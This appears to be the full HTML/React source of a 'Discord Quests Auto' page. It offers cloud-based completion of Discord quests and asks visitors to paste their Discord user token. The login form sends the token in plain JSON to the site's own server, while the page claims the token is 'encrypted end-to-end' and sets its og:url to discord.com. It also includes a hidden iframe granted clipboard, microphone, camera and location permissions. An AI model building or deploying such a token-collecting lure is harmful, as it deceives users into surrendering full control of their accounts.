<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Discord Quests Auto</title>
  
  <meta property="og:title" content="Discord Quests Auto"/>
  <meta property="og:description" content="• Automatically executes quests and syncs data even when tabs are closed.&#10;• Operates stably on cloud infrastructure, ensuring continuous 24/7 progress.&#10;• Multi-layer encryption technology protecting privacy and account safety.&#10;• Perfect compatibility across all platforms."/>
  <meta property="og:type" content="website"/>
  <meta property="og:url" content="https://discord.com/"/>
  <meta name="theme-color" content="#EB459E">
  
  <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
  <link rel="shortcut icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
  <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  
  <!-- React & React DOM -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  
  <!-- Babel for JSX Compilation in Browser -->
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest"></script>

  <style>
    :root {
      --blurple: #5865F2;
      --blurple-dark: #4752C4;
      --fuchsia: #EB459E;
      --green: #3DD68C;
      --bg-primary: #0a0b0e;
    }

    body {
      background-color: var(--bg-primary);
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      overflow: hidden;
    }

    #content-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100dvh;
      height: -webkit-fill-available;
      border: none;
      z-index: 50;
      display: none;
      max-width: 100vw;
      overflow: hidden;
      opacity: 0;
      transition: opacity 0.6s ease;
    }

    #content-frame.visible {
      opacity: 1;
    }

    .glass {
      background: rgba(18, 20, 29, 0.7);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    .text-gradient-aurora {
      background: linear-gradient(135deg, #5865f2 0%, #e879f9 50%, #3dd68c 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .dot-success {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background-color: #3dd68c;
      box-shadow: 0 0 8px #3dd68c;
    }

    .aurora-blob-1 { filter: blur(80px); animation: float 12s ease-in-out infinite alternate; }
    .aurora-blob-2 { filter: blur(90px); animation: float 15s ease-in-out infinite alternate-reverse; }
    .aurora-blob-3 { filter: blur(100px); animation: float 18s ease-in-out infinite alternate; }

    @keyframes float {
      0% { transform: translate(0px, 0px) scale(1); }
      100% { transform: translate(30px, 40px) scale(1.1); }
    }

    .scrollbar-hide::-webkit-scrollbar { display: none; }
    .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }

    #root {
      transition: opacity 0.5s ease, transform 0.5s ease;
    }

    .fade-out {
      opacity: 0 !important;
      pointer-events: none;
      transform: scale(1.03);
    }
  </style>
</head>
<body class="bg-[#0a0b0e] text-white antialiased overflow-hidden">

  <!-- Background target container frame -->
  <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>

  <!-- Main Modern UI Overlay Root -->
  <div id="root"></div>

  <!-- Main React UI Logic -->
  <script type="text/babel">
    const { useState, useEffect } = React;

    const Icon = ({ name, className = "w-4 h-4", style = {} }) => {
      useEffect(() => {
        if (window.lucide) {
          window.lucide.createIcons();
        }
      }, [name]);
      return <i data-lucide={name} className={className} style={style}></i>;
    };

    function LoginPage() {
      const [tokenInput, setTokenInput] = useState("");
      const [showPassword, setShowPassword] = useState(false);
      const [loading, setLoading] = useState(false);
      const [success, setSuccess] = useState(false);
      const [errorMessage, setErrorMessage] = useState("");
      const [statusText, setStatusText] = useState("Connecting to server");

      useEffect(() => {
        const msgs = ['Connecting to server', 'Authenticating data', 'Loading resources', 'Initializing system'];
        let idx = 0;
        const interval = setInterval(() => {
          idx = (idx + 1) % msgs.length;
          setStatusText(msgs[idx]);
        }, 1200);
        return () => clearInterval(interval);
      }, []);

      const handleLogin = async () => {
        if (!tokenInput.trim()) {
          setErrorMessage("Please enter a valid Discord token.");
          return;
        }
        setLoading(true);
        setErrorMessage("");

        try {
          const res = await fetch("/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: tokenInput.trim() }),
          });
          const data = await res.json();

          if (!res.ok || !data.success) {
            setErrorMessage(data.error || "Invalid token provided.");
            setLoading(false);
            return;
          }

          setSuccess(true);
        } catch (err) {
          setErrorMessage("Connection error: " + err.message);
          setLoading(false);
        }
      };

      const features = [
        {
          icon: "zap",
          title: "24/7 Automation",
          desc: "Executes quests and syncs data seamlessly in background cloud infrastructure.",
          color: "#5865F2",
        },
        {
          icon: "shield-check",
          title: "Account Safety",
          desc: "Multi-layer encryption technology protecting your privacy and session credentials.",
          color: "#3DD68C",
        },
        {
          icon: "globe",
          title: "Cross-Platform Sync",
          desc: "Multi-platform compatibility ensuring continuous progress even when tabs are closed.",
          color: "#F5B544",
        },
      ];

      return (
        <div className="h-screen flex flex-col relative overflow-y-auto scrollbar-hide">
          {/* Aurora Glow Backgrounds */}
          <div className="fixed inset-0 -z-10 overflow-hidden pointer-events-none">
            <div style={{ background: "radial-gradient(circle, rgba(88, 101, 242, 0.35) 0%, rgba(88, 101, 242, 0.08) 35%, transparent 65%)" }} className="absolute top-[-15%] left-[-10%] w-[60vw] h-[60vw] rounded-full aurora-blob-1" />
            <div style={{ background: "radial-gradient(circle, rgba(235, 69, 158, 0.25) 0%, rgba(235, 69, 158, 0.06) 35%, transparent 65%)" }} className="absolute bottom-[-20%] right-[-10%] w-[55vw] h-[55vw] rounded-full aurora-blob-2" />
            <div style={{ background: "radial-gradient(circle, rgba(61, 214, 140, 0.12) 0%, rgba(61, 214, 140, 0.03) 40%, transparent 70%)" }} className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[40vw] h-[40vw] rounded-full aurora-blob-3" />
          </div>

          {/* Header */}
          <header className="relative z-10 px-6 lg:px-10 py-5 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-lg bg-[#5865F2] flex items-center justify-center font-bold text-white shadow-lg shadow-[#5865F2]/30">
                Q
              </div>
              <span className="font-bold text-sm tracking-wide text-white">Discord Quests Auto</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="hidden sm:flex items-center gap-1.5 text-xs text-white/60 px-3 py-1.5 rounded-md bg-white/[0.03] border border-white/[0.06]">
                <span className="text-[11px] font-mono text-white/50" id="statusIndicator">{statusText}...</span>
              </div>
            </div>
          </header>

          {/* Main Content */}
          <main className="flex-1 grid lg:grid-cols-2 gap-8 lg:gap-16 px-6 lg:px-12 xl:px-16 py-6 lg:py-12 relative z-10 max-w-[1400px] mx-auto w-full">
            {/* Left Column */}
            <div className="flex flex-col justify-center">
              <div className="inline-flex self-start items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/[0.04] border border-white/[0.08] mb-6">
                <span className="dot-success" />
                <span className="text-[11px] font-mono text-white/60 tracking-wide">SYSTEM ONLINE</span>
              </div>
              <h1 className="text-4xl lg:text-5xl xl:text-6xl font-bold text-white mb-5 leading-[1.05]">
                Auto Complete<br />
                <span className="text-gradient-aurora">Discord Quests</span>
              </h1>
              <p className="text-white/50 text-base lg:text-lg leading-relaxed max-w-md mb-8">
                Automated background completion for Discord Quests. Operates stably on cloud infrastructure with full cross-platform compatibility.
              </p>
              <div className="space-y-4 mb-8 max-w-md">
                {features.map((item) => (
                  <div key={item.title} className="flex items-start gap-3">
                    <div style={{ background: `${item.color}1A`, border: `1px solid ${item.color}30`, color: item.color }} className="w-9 h-9 rounded-md flex items-center justify-center shrink-0">
                      <Icon name={item.icon} className="w-4 h-4" />
                    </div>
                    <div>
                      <p className="text-[14px] font-semibold text-white leading-tight">{item.title}</p>
                      <p className="text-[12px] text-white/50 leading-relaxed mt-1">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Right Column - Form Card */}
            <div className="flex items-center justify-center">
              <div className="glass rounded-2xl p-6 lg:p-8 w-full max-w-[440px]">
                <div className="flex items-center justify-between mb-5">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-md flex items-center justify-center bg-[#5865F2]/15 border border-[#5865F2]/25">
                      <Icon name="shield-check" className="w-4 h-4 text-[#5865F2]" />
                    </div>
                    <div>
                      <p className="text-[14px] font-semibold text-white">Sign In</p>
                      <p className="text-[11px] text-white/40">Enter Discord User Token</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1 px-2 py-1 rounded-md bg-white/[0.03] border border-white/[0.06]">
                    <Icon name="fingerprint" className="w-3 h-3 text-white/40" />
                    <span className="text-[9px] font-mono text-white/50 uppercase tracking-wider">Secure</span>
                  </div>
                </div>

                <div className="mb-5 flex items-start gap-2.5 p-3 rounded-lg bg-[#EB459E]/[0.08] border border-[#EB459E]/20">
                  <Icon name="triangle-alert" className="w-4 h-4 text-[#EB459E] shrink-0 mt-0.5" />
                  <div>
                    <p className="text-[12px] font-semibold text-[#EB459E] mb-0.5">Automated Quest Engine</p>
                    <p className="text-[11px] text-white/50 leading-relaxed">Runs on cloud hardware continuously to auto-sync quest status in real time.</p>
                  </div>
                </div>

                <label className="block text-[11px] font-medium text-white/50 mb-1.5 uppercase tracking-wider">Discord Token</label>
                <div className="relative mb-3">
                  <input
                    type={showPassword ? "text" : "password"}
                    placeholder="Paste token here..."
                    value={tokenInput}
                    onChange={(e) => setTokenInput(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    disabled={loading || success}
                    className="w-full bg-white/[0.03] border border-white/[0.08] text-white placeholder:text-white/30 h-12 px-3 pr-12 font-mono text-sm rounded-lg focus:outline-none focus:border-[#5865F2]/50 focus:bg-white/[0.05] transition-all"
                  />
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    type="button"
                    className="absolute right-3 top-1/2 -translate-y-1/2 w-7 h-7 rounded-md flex items-center justify-center text-white/40 hover:text-white transition-colors"
                  >
                    <Icon name={showPassword ? "eye-off" : "eye"} className="w-4 h-4" />
                  </button>
                </div>

                {errorMessage && (
                  <div className="mb-3 flex items-center gap-2 p-2.5 rounded-lg bg-[#F6606F]/[0.08] border border-[#F6606F]/20 text-[#F6606F] text-xs">
                    <Icon name="triangle-alert" className="w-3.5 h-3.5 shrink-0" />
                    {errorMessage}
                  </div>
                )}

                <button
                  onClick={handleLogin}
                  disabled={loading || !tokenInput.trim() || success}
                  className="w-full h-12 bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold text-sm rounded-lg transition-all flex items-center justify-center gap-2 disabled:opacity-60 shadow-lg shadow-[#5865F2]/20"
                >
                  {loading ? "Authenticating..." : "Log In"}
                  <Icon name="arrow-right" className="w-4 h-4" />
                </button>

                <div className="mt-4 flex items-center gap-2 text-[10px] text-white/30">
                  <Icon name="lock" className="w-3 h-3" />
                  <span>Tokens are stored per session and encrypted end-to-end.</span>
                </div>
              </div>
            </div>
          </main>

          {/* Footer */}
          <footer className="relative z-10 px-6 lg:px-10 py-4 flex items-center justify-between text-[10px] font-mono text-white/30 border-t border-white/[0.04]">
            <span>© 2026 Discord Quest Auto</span>
            <span className="text-[#EB459E]">Translated by Kirus</span>
          </footer>
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById("root"));
    root.render(<LoginPage />);
  </script>

  </script>
</body>
</html>
